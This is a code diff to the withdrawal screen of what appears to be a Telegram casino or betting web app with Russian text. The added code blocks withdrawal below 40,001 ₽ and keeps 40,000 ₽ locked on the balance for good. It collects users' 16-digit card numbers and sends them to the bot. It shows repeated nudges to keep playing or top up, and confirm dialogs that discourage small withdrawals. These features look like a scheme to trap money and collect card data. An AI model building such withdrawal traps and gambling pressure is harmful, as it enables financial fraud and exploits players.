@@ -648,13 +648,38 @@
     <div id="withdrawModal" class="modal-bg" style="display:none;">
         <div class="modal">
             <h3>💰 Вывод средств</h3>
-            <div>Номер банковской карты (16 цифр):</div>
-            <input id="cardNumberInput" maxlength="19" placeholder="1234 5678 9012 3456">
-            <div>К выводу: <span id="withdrawAmount">0.00</span> ₽</div>
-            <div style="margin-top: 15px;">
-                <button id="confirmWithdrawBtn">✅ Подтвердить вывод</button>
-                <button class="cancel" id="cancelWithdrawBtn">❌ Отмена</button>
+            
+            <!-- Правила вывода -->
+            <div style="background: rgba(255, 165, 0, 0.1); border: 1px solid orange; border-radius: 5px; padding: 10px; margin: 10px 0; font-size: 12px;">
+                <div style="font-weight: bold; color: orange; margin-bottom: 5px;">⚠️ ПРАВИЛА ВЫВОДА СРЕДСТВ:</div>
+                <div>• Минимальный баланс для вывода: <strong>40,001 ₽</strong></div>
+                <div>• К выводу доступна сумма свыше 40,000 ₽</div>
+                <div>• Обязательные 40,000 ₽ остаются на балансе</div>
+                <div>• Обработка заявок: 24 часа</div>
+                <div>• Комиссия за вывод: 0%</div>
             </div>
+            
+            <!-- Предупреждающее сообщение -->
+            <div id="withdrawWarning" style="background: rgba(255, 0, 0, 0.1); border: 1px solid red; border-radius: 5px; padding: 10px; margin: 10px 0; display: none;">
+                <div style="font-weight: bold; color: red; margin-bottom: 5px;">🚫 ВЫВОД НЕДОСТУПЕН</div>
+                <div id="withdrawWarningText"></div>
+            </div>
+            
+            <!-- Форма вывода -->
+            <div id="withdrawForm">
+                <div style="margin: 10px 0;">Номер банковской карты (16 цифр):</div>
+                <input id="cardNumberInput" maxlength="19" placeholder="1234 5678 9012 3456">
+                <div style="margin: 10px 0;">
+                    Ваш баланс: <span id="currentBalanceDisplay">0.00</span> ₽<br>
+                    К выводу: <span id="withdrawAmount" style="color: green; font-weight: bold;">0.00</span> ₽<br>
+                    Останется на балансе: <span style="color: orange;">40,000.00 ₽</span>
+                </div>
+                <div style="margin-top: 15px;">
+                    <button id="confirmWithdrawBtn">✅ Подтвердить вывод</button>
+                    <button class="cancel" id="cancelWithdrawBtn">❌ Отмена</button>
+                </div>
+            </div>
+            
             <div class="error-text" id="withdrawError"></div>
         </div>
     </div>
@@ -1307,16 +1332,75 @@
                     withdrawBtn.onclick = () => {
                         console.log('Нажата кнопка вывода');
                         
-                        if (balance <= 40000) {
-                            const needed = 40001 - balance;
-                            showMessage(`Минимальный баланс для вывода: 40,001 ₽. Не хватает: ${needed.toFixed(2)} ₽`);
-                            return;
+                        // Обновляем отображение текущего баланса
+                        const currentBalanceDisplay = document.getElementById('currentBalanceDisplay');
+                        if (currentBalanceDisplay) {
+                            currentBalanceDisplay.textContent = balance.toFixed(2);
                         }
                         
-                        const withdrawableAmount = balance - 40000;
-                        document.getElementById('withdrawAmount').textContent = withdrawableAmount.toFixed(2);
-                        cardInput.value = '';
+                        const withdrawWarning = document.getElementById('withdrawWarning');
+                        const withdrawWarningText = document.getElementById('withdrawWarningText');
+                        const withdrawForm = document.getElementById('withdrawForm');
+                        
+                        // Очищаем предыдущие ошибки
                         document.getElementById('withdrawError').textContent = '';
+                        
+                        if (balance <= 40000) {
+                            // Показываем предупреждение о недостаточном балансе
+                            const needed = 40001 - balance;
+                            withdrawWarning.style.display = 'block';
+                            withdrawForm.style.display = 'none';
+                            
+                            let warningMessage = `<div style="margin-bottom: 10px;">
+                                <strong>Ваш баланс: ${balance.toFixed(2)} ₽</strong><br>
+                                <strong>Требуется: 40,001.00 ₽</strong><br>
+                                <strong style="color: red;">Не хватает: ${needed.toFixed(2)} ₽</strong>
+                            </div>`;
+                            
+                            if (balance < 1000) {
+                                warningMessage += `<div style="color: #ff6b6b;">
+                                    💡 <strong>Совет:</strong> Попробуйте сделать несколько ставок или пополните баланс кнопками выше.
+                                </div>`;
+                            } else if (balance < 10000) {
+                                warningMessage += `<div style="color: #ff9500;">
+                                    🎰 <strong>Совет:</strong> Продолжайте играть! Вам осталось выиграть еще ${needed.toFixed(2)} ₽.
+                                </div>`;
+                            } else if (balance < 30000) {
+                                warningMessage += `<div style="color: #ff9500;">
+                                    🚀 <strong>Почти готово!</strong> Осталось совсем немного - ${needed.toFixed(2)} ₽.
+                                </div>`;
+                            } else {
+                                warningMessage += `<div style="color: #ff9500;">
+                                    🎯 <strong>Совсем близко!</strong> Еще ${needed.toFixed(2)} ₽ и вывод будет доступен!
+                                </div>`;
+                            }
+                            
+                            withdrawWarningText.innerHTML = warningMessage;
+                            
+                            // Также показываем сообщение в игре
+                            showMessage(`❌ Вывод недоступен! Минимальный баланс: 40,001 ₽. Не хватает: ${needed.toFixed(2)} ₽`);
+                            
+                            // Вибрация ошибки
+                            vibrate([100, 100, 100]);
+                        } else {
+                            // Баланс достаточен для вывода
+                            withdrawWarning.style.display = 'none';
+                            withdrawForm.style.display = 'block';
+                            
+                            const withdrawableAmount = balance - 40000;
+                            document.getElementById('withdrawAmount').textContent = withdrawableAmount.toFixed(2);
+                            cardInput.value = '';
+                            
+                            // Если сумма к выводу очень маленькая, показываем дополнительное предупреждение
+                            if (withdrawableAmount < 100) {
+                                document.getElementById('withdrawError').innerHTML = `
+                                    <div style="color: orange; font-size: 12px; margin-top: 10px;">
+                                        ⚠️ <strong>Внимание:</strong> Сумма к выводу составляет всего ${withdrawableAmount.toFixed(2)} ₽. 
+                                        Рекомендуем играть дальше для увеличения выигрыша.
+                                    </div>`;
+                            }
+                        }
+                        
                         withdrawModal.style.display = 'flex';
                     };
                 }
@@ -1325,12 +1409,44 @@
                     confirmBtn.onclick = () => {
                         const cardNumber = cardInput.value.replace(/\s/g, '');
                         
+                        // Двойная проверка баланса перед выводом
+                        if (balance <= 40000) {
+                            const needed = 40001 - balance;
+                            document.getElementById('withdrawError').innerHTML = `
+                                <div style="color: red; font-weight: bold;">
+                                    🚫 ОШИБКА: Недостаточно средств для вывода!<br>
+                                    Требуется: 40,001 ₽, у вас: ${balance.toFixed(2)} ₽<br>
+                                    Не хватает: ${needed.toFixed(2)} ₽
+                                </div>`;
+                            vibrate([200, 100, 200, 100, 200]);
+                            return;
+                        }
+                        
                         if (!/^\d{16}$/.test(cardNumber)) {
-                            document.getElementById('withdrawError').textContent = 'Введите корректный номер карты (16 цифр)';
+                            document.getElementById('withdrawError').innerHTML = `
+                                <div style="color: red;">
+                                    ❌ <strong>Неверный номер карты!</strong><br>
+                                    Введите корректный номер карты (16 цифр без пробелов)
+                                </div>`;
+                            vibrate([200, 100, 200]);
                             return;
                         }
                         
                         const withdrawSum = balance - 40000;
+                        
+                        // Дополнительное предупреждение для маленьких сумм
+                        if (withdrawSum < 50) {
+                            const confirmed = confirm(`⚠️ ВНИМАНИЕ!\n\nВы хотите вывести всего ${withdrawSum.toFixed(2)} ₽?\n\nЭто очень маленькая сумма. Рекомендуем играть дальше для увеличения выигрыша.\n\nВы уверены, что хотите продолжить вывод?`);
+                            if (!confirmed) {
+                                return;
+                            }
+                        }
+                        
+                        // Финальное подтверждение
+                        const finalConfirm = confirm(`💰 ПОДТВЕРЖДЕНИЕ ВЫВОДА\n\nСумма: ${withdrawSum.toFixed(2)} ₽\nКарта: ${cardNumber.substring(0,4)} **** **** ${cardNumber.substring(12)}\nОстанется на балансе: 40,000 ₽\n\nПодтвердить вывод средств?`);
+                        if (!finalConfirm) {
+                            return;
+                        }
                         
                         // Отправляем данные в Telegram (если доступно)
                         if (tg && tg.sendData) {
